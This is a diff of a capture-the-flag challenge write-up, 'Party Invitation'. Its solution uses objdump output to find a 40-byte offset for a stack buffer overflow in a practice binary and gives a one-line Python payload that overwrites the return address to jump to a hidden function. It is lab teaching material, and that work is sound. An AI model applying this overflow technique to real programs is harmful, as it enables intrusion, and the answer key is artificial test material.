@@ -1,16 +1,15 @@
 # Party Invitation
 
 ## Question Text
-
 There's an awesome that's going to go down next week. Gotta get the invitation!
 
 Created by Noans
 
 ## Distribution
-AwesomeParty `MD5: 7e62828feb0a57a252efc944ccae3c29`
+AwesomeParty `SHA1: a31ecb2e11a5b6762f78244f5103b424b0080b72`
 
 ## Solution
-1. Do an objdump on `AwesomeParty` with the command `objdump -d AwesomeParty`.
+1. Players will need to do an objdump on `AwesomeParty` with the command `objdump -d AwesomeParty`.
 2. The following parts of from the `objdump` should be studied:  
 ```
 00000000004005c6 <check>:
@@ -43,9 +42,9 @@ Disassembly of section .special:
 1a1b1c37:	c3                   	retq 
 ```
 3. The third line tells us 32 bytes is reserved for a variable.
-4. Understand that the next 8 bytes stores the `%rbp`.
+4. They would also need to know that the next 8 bytes stores the `%rbp`.
 5. Derive that one needs to write 40 bytes of garbage before one can overwrite the return address for the `check` function.
-5. Also derive address of `invitation` function is `1a1b1c1d`.
+5. Also derive that the address of `invitation` function is `1a1b1c1d`.
 
 Final command to exploit local program assuming machine uses little-endian:  
 `python -c 'print "a" * 40 + "\x1d\x1c\x1b\x1a"' | ./AwesomeParty`
